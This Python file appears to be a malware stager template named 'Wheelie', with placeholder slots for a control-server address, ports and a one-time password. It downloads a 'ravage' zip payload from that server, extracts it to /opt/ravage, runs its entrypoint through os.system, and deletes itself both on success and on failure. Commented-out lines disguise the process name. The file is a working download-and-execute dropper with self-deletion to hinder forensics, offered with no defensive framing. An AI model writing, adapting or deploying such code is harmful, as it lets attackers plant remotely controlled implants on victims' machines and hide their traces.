import random
import string
import urllib.request
import urllib.error
import os
import subprocess
from zipfile import ZipFile


def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for _ in range(length))
    return result_str


WHEELIE_PATH = os.path.abspath(__file__)
RAVAGE_ZIP_FILE = f'/opt/ravage/ravage.zip'
RAVAGE_ROOT_DIR = f'/opt/ravage'

SOUNDWAVE_IP = '<>SOUNDWAVE_IP</>'
RAVAGE_IP = '<>RAVAGE_IP</>'
WEB_SERVER_PORT = '<>WEB_SERVER_PORT</>'
COMMUNICATION_PORT = '<>COMMUNICATION_PORT</>'
ONE_TIME_PASSWORD = '<>ONE_TIME_PASSWORD</>'

try:
    req = urllib.request.Request(f'http://{SOUNDWAVE_IP}:{WEB_SERVER_PORT}/ravage')
    req.add_header('one-time-password', ONE_TIME_PASSWORD)
    with urllib.request.urlopen(req) as res:
        data = res.read()

except urllib.error.HTTPError as ex:
    print('Request failed - Self destructing...')
    os.unlink(WHEELIE_PATH)


else:
    os.makedirs(os.path.dirname(RAVAGE_ZIP_FILE), exist_ok=True)

    with open(RAVAGE_ZIP_FILE, 'wb') as fh:
        fh.write(data)

    with ZipFile(RAVAGE_ZIP_FILE) as zf:
        zf.extractall(RAVAGE_ROOT_DIR)

    os.unlink(RAVAGE_ZIP_FILE)
    os.unlink(WHEELIE_PATH)

    # entrypoint = f'{RAVAGE_ROOT_DIR}/entrypoint.py'

    print('Wheelie: Mission successful')
    # TODO set start_new_session to true
    # ravage = subprocess.Popen(['python3', '-m', 'ravage', SOUNDWAVE_IP, RAVAGE_IP, COMMUNICATION_PORT], cwd=os.path.join(RAVAGE_ROOT_DIR, '..'), start_new_session=False)
    # os.system(f'chmod +x {entrypoint}; {entrypoint} {SOUNDWAVE_IP} {RAVAGE_IP} {COMMUNICATION_PORT}')
    # ravage = subprocess.Popen(['bash', '-c', f'exec -a YEEEET python3 -m ravage {SOUNDWAVE_IP} {RAVAGE_IP} {COMMUNICATION_PORT}'], cwd=os.path.join(RAVAGE_ROOT_DIR, '..'), start_new_session=False)
    # ravage.wait()
    os.environ['SOUNDWAVE_IP'] = SOUNDWAVE_IP
    os.environ['RAVAGE_IP'] = RAVAGE_IP
    os.environ['COMMUNICATION_PORT'] = COMMUNICATION_PORT
    os.environ['RAVAGE_ROOT_DIR'] = RAVAGE_ROOT_DIR
    os.system(f'python3 {RAVAGE_ROOT_DIR}/entrypoint')
